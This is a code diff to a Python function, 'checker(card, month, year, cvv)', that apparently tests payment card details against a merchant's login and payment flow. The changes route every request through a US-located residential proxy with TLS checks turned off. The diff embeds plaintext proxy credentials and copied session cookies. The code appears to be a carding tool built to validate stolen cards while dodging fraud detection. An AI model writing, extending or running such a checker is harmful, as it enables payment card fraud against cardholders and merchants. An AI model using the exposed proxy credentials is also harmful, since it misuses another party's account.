@@ -95,7 +95,7 @@ def checker(card, month, year, cvv):
         
         try:
             
-            p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2@brd.superproxy.io:22225'}
+            p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225'}
             
             if len(year) == 4:
                 year = year[2:]
@@ -122,7 +122,7 @@ def checker(card, month, year, cvv):
             #'Cookie': 'allow_cookies="yes"; _gcl_au=1.1.1224439006.1712786777; _gid=GA1.2.950426332.1712786778; _fbp=fb.1.1712786778151.1002254645; _pin_unauth=dWlkPU1UbGpPVGs0TnpndE5qaGlZeTAwWXpJM0xXSTFNekF0WmpSa1pXUXlaVGRtTVdRdw; language="en_GB"; locale="en_GB"; client_secure="8nPuHrcJEZDRs7W"; _gat_UA-114148720-1=1; bpt="nAGY.nAGYgMDK-1712790582730"; _ga_J4R614QWT5=GS1.1.1712786777.1.1.1712790582.24.0.0; _ga=GA1.1.1494828109.1712786777; _ga_W3XK1HZ6LH=GS1.1.1712786777.1.1.1712790582.0.0.0'
             }
 
-            response = requests.request("GET", url, headers=headers, data=payload, verify=False)
+            response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p)
             email_id = pegarItem(response.text, '<INPUT TYPE="email" NAME="','" VALUE="Email or login"')
             password = pegarItem(response.text, '<INPUT TYPE="password" NAME="','"')
             bpt = response.cookies.get('bpt')
@@ -150,7 +150,7 @@ def checker(card, month, year, cvv):
                 'Content-Type': 'application/x-www-form-urlencoded'
                 }
 
-            response = requests.request("POST", url, headers=headers, data=payload, verify=False)
+            response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
             client_secure = response.headers.get('client_secure')
             
       
@@ -178,7 +178,7 @@ def checker(card, month, year, cvv):
                 'Cookie': f'allow_cookies="yes"; _gcl_au=1.1.1224439006.1712786777; _gid=GA1.2.950426332.1712786778; _fbp=fb.1.1712786778151.1002254645; _pin_unauth=dWlkPU1UbGpPVGs0TnpndE5qaGlZeTAwWXpJM0xXSTFNekF0WmpSa1pXUXlaVGRtTVdRdw; language="en_GB"; locale="en_GB"; bpt={bpt}; client_secure={client_secure}; _gat_UA-114148720-1=1; _ga_J4R614QWT5=GS1.1.1712786777.1.1.1712790490.55.0.0; _ga=GA1.2.1494828109.1712786777; _ga_W3XK1HZ6LH=GS1.1.1712786777.1.1.1712790499.0.0.0',
                 'Content-Type': 'application/x-www-form-urlencoded'
                 }
-            response = requests.request("POST", url, headers=headers, data=payload, verify=False)
+            response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
 
 
  
@@ -205,7 +205,7 @@ def checker(card, month, year, cvv):
                 'Cookie': f'allow_cookies="yes"; _gcl_au=1.1.1224439006.1712786777; _gid=GA1.2.950426332.1712786778; _fbp=fb.1.1712786778151.1002254645; _pin_unauth=dWlkPU1UbGpPVGs0TnpndE5qaGlZeTAwWXpJM0xXSTFNekF0WmpSa1pXUXlaVGRtTVdRdw; language="en_GB"; locale="en_GB"; bpt={bpt}; client_secure={client_secure}; _gat_UA-114148720-1=1; _ga=GA1.1.1494828109.1712786777; _ga_J4R614QWT5=GS1.1.1712786777.1.1.1712790502.43.0.0; _ga_W3XK1HZ6LH=GS1.1.1712786777.1.1.1712790542.0.0.0',
                 'Content-Type': 'application/x-www-form-urlencoded'
                 }
-            response = requests.request("POST", url, headers=headers, data=payload, verify=False, allow_redirects=False)
+            response = requests.request("POST", url, headers=headers, data=payload, verify=False, allow_redirects=False, proxies=p)
             if "Redirection" in response.text:
                 raise RequisicaoException()
             
